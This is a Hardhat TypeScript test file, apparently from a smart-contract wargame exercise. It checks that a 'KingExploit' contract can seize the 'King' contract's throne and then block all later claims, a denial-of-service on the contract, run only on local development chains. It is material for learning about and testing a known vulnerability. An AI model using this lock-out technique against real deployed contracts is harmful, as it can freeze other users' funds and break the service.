import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { assert, expect } from "chai"
import { ethers, network, deployments } from "hardhat"
import { Address } from "hardhat-deploy/dist/types"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { King, KingExploit } from "../../typechain-types"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("King Exploit Testing", () => {
          let king: King
          let kingExploit: KingExploit
          let deployer: SignerWithAddress, exploiter: SignerWithAddress
          // run before test cases
          before(async () => {
              await deployments.fixture(["king"])
              king = await ethers.getContract("King")
              kingExploit = await ethers.getContract("KingExploit")
              const accounts = await ethers.getSigners()
              deployer = accounts[0]
              exploiter = accounts[1]
          })

          it("king exploit", async () => {
              const transferAmt = ethers.utils.parseEther("0.00011")

              // check if deployer is current king
              expect(await king._king()).equals(deployer.address, "king == deployer")
              // send 0.00011 eth and become king

              const tx = await kingExploit.sendFunds(king.address, transferAmt)
              await tx.wait(1)

              expect(await king._king()).equals(kingExploit.address, "king == exploiter")

              const tx2 = {
                  to: king.address,
              }
              await expect(deployer.sendTransaction(tx2)).to.be.revertedWith("transfer error")
          })
      })
